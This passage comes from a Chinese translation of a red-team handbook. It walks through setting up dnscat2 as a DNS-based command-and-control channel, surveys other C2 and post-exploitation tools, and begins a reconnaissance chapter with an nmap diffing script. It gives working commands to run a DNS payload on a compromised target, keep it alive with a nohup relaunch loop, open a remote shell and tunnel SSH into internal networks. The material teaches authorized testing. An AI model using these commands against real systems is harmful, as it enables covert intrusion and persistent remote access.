(如果你在 windows 环境下编译，需要将 client/win32/dnscat2.vcproj 加载到 Visual Studio 并点击
“build” )
现在我们已经配置好了权威 DNS，我们的攻击服务器作为一个 DNS 服务器正在运行
dnscat2，并且我们已经编译了恶意软件。我们已经准备好在目标机器中执行我们的
payload。
34
第1章 赛前准备——安装
在开始之前，我们需要在攻击服务器上启动 dnscat2。要启用多个配置，其中的主要配置是配
置那个 -secret 标志来确保我们在 DNS 请求中的通信是加密的。另外，一定要更换我上面
用于演示的 loca1host.com 域名，使用你自己拥有的域名并创建随机密钥字符串。
在你的攻击服务器中启用 dnscat2:
screen
ruby ./dnscat2.rb loca1host.com —secret 39dfj3hdsfajh37e8c902j
假设你在易受攻击的服务器上有某种 RCE（远程命令执行漏洞）。 你可以运行 shell 命令并
上传我们的 dnscat payload。执行 payload：
./dnscat loca1host.com —secret 39dfj3hdsfajh37e8c902j
这将在目标机器中启动 dnscat，域名查询使用了我们自定义的的权威服务器，从而创建我们
的 C2 通道。 我留意到一件事是有时 dnscat2 进程会莫名其妙挂掉。这可能来自大型文件传
输或者只是程序崩了。为了规避这些类型的问题，我想确认我的 dnscat payload 有返回。为
此，我通常喜欢使用快速 bash 脚本启动我的 dnscat payload：
nohup /bin/bash -c “while true; do /opt/dnscat2/client/dnscat loca1host.com -secret 9d
fj3hdsfajh37e8c902j -max-retransmits 5; sleep 3600; done” > /dev/null 2>&1 &
这将确保如果客户端 payload 进程因任何原因而挂掉了，它将每小时生成一个新的实例。有
时你只有一次机会来运行你的 payload，那么你需要让程序自己计数！ 最后，如果你要在
Windows 上跑这个 payload，你可以编译使用 dnscat2 payload......或者，为什么不在
PowerShell 中执行此操作呢？！ Luke Baggett 写了一个关于 dnscat 客户端的 PowerShell 版
本->点此查看。
dnscat2的连接
在我们的 payload 执行并连接回我们的攻击服务器之后，我们应该看到类似于下面的一个新
的 消息。通过输入 “window”，dnscat2 将显示所有会话。现在，我们
ENCRYPTED AND VERIFIED
有一个名为“1”的单行命令会话。
35
第1章 赛前准备——安装
我们可以通过与我们的命令会话交互来生成终端样式 shell:
与我们的第一个命令会话进行交互
window -i 1
启动shell会话
shell
回到主会话
Ctrl-z
与 2 会话进行交互
window -i 2
现在，你应该能够运行所有 shell 命令（例如 ls）
虽然这不是最快的shell，但由于所有通信都是通过 DNS 进行的，因此它确实可以在一些
Meterpreter 或类似 shell 无法正常工作的情境下生效。 dnscat2 更好的地方是它完全支持搭
建隧道。这样，如果我们想要使用来自我们的主机系统的漏洞利用模块，我们可以通过隧道
和浏览器来访问其内部网站，甚至是 SSH 连接到另外的机器中，这一切都是可能的。
dnscat2 隧道
36
第1章 赛前准备——安装
我们有很多时候想要将来自攻击服务器的流量通过我们的受感染主机传递到其他内部服务
器。使用 dnscat2 执行此操作的最安全方法是通过本地端口转发我们的流量，然后将流量通
过隧道传输到内部网络上的其他机器上。我们可以通过命令会话中的以下命令来完成此示
例：
listen 127.0.0.1:9999 10.100.100.1:22
创建隧道后，我们可以返回攻击计算机上的根终端窗口，通过本地的 9999 端口使用 SSH 连
接到 localhost，然后成功连接到受害者网络上的内部系统并进行身份验证。
译者注：这里如果看不懂，可以看看这篇文章加深理解 -> 使用SSH反向隧道进行内网穿
透
这将提供各种各样的乐趣和一个很好的测试，来看你的客户的网络是否可以主动检测大量
DNS 查询和溢出。那么，请求和响应是什么样子的呢? 使用 Wireshark 快速抓包发现：
dnscat2 为许多不同的长子域创建了大量不同的 DNS 请求。
现在，你可能想要测试许多其他的协议。例如，Nishang 有一个基于 PowerShell 的 ICMP
Shell( http://bit.ly/2GXhdnZ )，它使用 https://github.com/inquisb/icmpsh 作为 C2 服务器。
还有其他 ICMP shell，如:
https://github.com/jamesbarlow/icmptunnel
https://github.com/DhavalKapil/icmptunnel
http://code.gerade.org/hans/
p0wnedShell
37
第1章 赛前准备——安装
正如 p0wnedShell 的 Github 页面所述，这个工具是“用 C＃ 编写的进攻型 PowerShell 主机
应用程序，它不依赖于 powershell.exe，而是在 powershell 运行空间环境（.NET）中运行
powershell 命令和函数。它包含了大量的 PowerShell 攻击模块和二进制文件，使后期利用过
程变得更加容易。我们尝试的是建立一个‘一体化’的后渗透利用工具，我们可以使用它来绕过
所有保护措施（至少是其中一些），p0wnedShell 中包含了所有的相关工具。你可以利用
p0wnedShell 来在活动目录环境中执行现代化的攻击，并在你的蓝队中创建意识，以帮助他
们构建正确的防御策略。”
Pupy Shell
Pupy 是“一个开源，跨平台（Windows，Linux，OSX，Android）的远程管理和后渗透利用工
具，主要用python编写”。
Pupy 的一个非常棒的功能是，你可以在所有代理上运行 Python，而无需在所有主机上实际
安装 Python。 因此，如果你尝试在自定义框架中编写大量攻击脚本，Pupy就是一个很合适
的工具。
PoshC2
PoshC2 是一个代理感知型 C2 框架，完全用 PowerShell 编写，以帮助渗透测试人员进行红
队合作，后渗透利用和横向移动。这些工具和模块是基于我们成功的 PowerShell 会话和
Metasploit 框架的 payload 类型的汇总。PowerShell 被选为基本语言，因为它提供了所需的
所有功能和丰富的拓展特性，而无需向框架引入多种语言。
Merlin
Merlin 利用最近开发的名为 HTTP/2 (RFC7540) 的协议。 “HTTP/2 的通信是多路复用的双向
连接，在一个请求和响应之后不会结束。 此外，HTTP/2 是一种二进制协议，因此它紧凑、
易于解析，并且如果不借助解释器的话人是几乎读不懂的”(Russel Van Tuyl 2017)。
注:
此句话出处为：
Russel Van Tuyl, "Merlin - 跨平台后持续利用 HTTP/2 C2 工具", Medium[Online], 发表于
2017年12月19日, 可获取地址：
https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a
检索于 2019 年 2 月 27 日
Merlin 是一个用 GO 编写的工具，外观和感觉类似于 PowerShell Empire，并且允许使用轻量
级代理。它不支持任何类型的后渗透利用模块，因此你必须自己完成模块的开发。
Nishang
38
第1章 赛前准备——安装
Nishang 是一个脚本和 payload 的框架和集合，可以使用 PowerShell 进行进攻型安全测试，
渗透测试和红队测试。 Nishang 在渗透测试的所有阶段都很有用。
虽然 Nishang 实际上是一系列令人惊叹的 PowerShell 脚本的集合，但也包含一些轻量级的
C2 脚本。
本章总结
现在你终于准备开战。你并非像刚开始那样手无寸铁了，你有这些工具和配置过的服务器。
好的准备将帮助你绕过包括网络检测工具、网络协议被拦截、基于主机的安全工具在内的任
何障碍。
对于本书中的实验，我创建了基于 Kali Linux 的添加了所有工具的完整版虚拟机 -> 点此获取
。在 The Hacking Playbook 的存档中，有一个名为 List_of_Tools.txt 的文本文件，里面列
出了所有添加的工具。虚拟机的默认用户名/密码是 root/toor。
39
第2章 发球前——红队侦察
第2章 发球前——红队侦察
译者：@Snowming
在 The Hacking Playbook 2 中，前面的发球部分重点介绍了一些不同的工具，如 Recon-
NG、Discover、Spiderfoot、Gitrob、Masscan、Sparta、HTTP Screenshot、漏洞扫描器
（包括 nessus，openvas）、Burp 套件等。这些工具我们可以在外网或内网络使用，对目标
的基础设施进行侦察或扫描。在本书中我们将延续这一做法，然后从红队的角度对侦察阶段
进行拓展。
环境探测
对于红队来说，这往往是进攻的好时机。你不仅需要随时准备好去攻击基础设施，还需要不
断地寻找它的漏洞。我们可以通过使用不同的工具来进行环境扫描、服务探测、检索云计算
配置错误。这些活动有助于你收集有关目标基础设施的更多信息，并找到攻击的最好方法。
扫描结果差异化分析
对于所有客户机，我们要做的第一件事就是设置不同的监视脚本。这些通常只是一些能快速
完成的 bash 脚本，它们每天通过电子邮件向我们发送客户机网络的差异。当然，在扫描之
前，确保你有适当合法的授权来执行扫描。
40
第2章 发球前——红队侦察
对于一般不太大的客户机网络，我们设置简单的 cronjob 来执行外部端口差异化分析。例如，
我们可以创建一个快速的 Linux bash 脚本来完成这项艰巨的工作（请记住替换下面脚本中的
IP 范围）:
!/bin/bash
mkdir /opt/nmap_diff
d=$(date +%Y-%m-%d)
y=$(date -d yesterday +%Y-%m-%d)
/usr/bin/nmap -T4 -oX /opt/nmapdiff/scan$d.xml 10.100.100.0/24 >
/dev/null 2>&1
if [ -e /opt/nmapdiff/scan$y.xml ]; then
/usr/bin/ndiff /opt/nmapdiff/scan$y.xml /opt/nmapdiff/scan$d.xml >
/opt/nmap_diff/diff.txt
fi
译者注：上面这段脚本中使用了正则表达式。所以本小节的英文名字叫 Regular
Nmap Diffing。
这是一个非常简单的脚本，它每天用默认的端口运行 nmap，然后使用 ndiff 比较结果。然
后，我们可以获取这个脚本的输出结果，并让它把每天发现的新端口及时通知我们的团队。
在上一本书中，我们着重讨论了 Masscan 的好处，以及它比 nmap 的速度快多少。Masscan
的开发者说，如果你的网络带宽足够大，你可以在6分钟内扫描完毕整个互联网。所以说，当
扫描大的范围时，Masscan 是很可靠的。Masscan 对我们最初的侦察很有用，但通常不用于
比较差异。
实验:
本书中的实验是选修的。在某些部分中，我添加了一些实验方便你进行测试或者扩展更多的
领域。这都是基于读者的个人兴趣的，如果对某方面感兴趣，我强烈推荐你花时间改进我们
的工具，并与社区共享它。
建立一个更好的网络 diff 扫描器:
41
第2章 发球前——红队侦察
构建一个比默认的 nmap 更好的端口列表(例如，nmap 默认的漏掉一些端口，比如
Redis 6379/6380 和其他端口)
实现 nmap banner
保持对端口的历史跟踪
建立电子邮件提醒/通知系统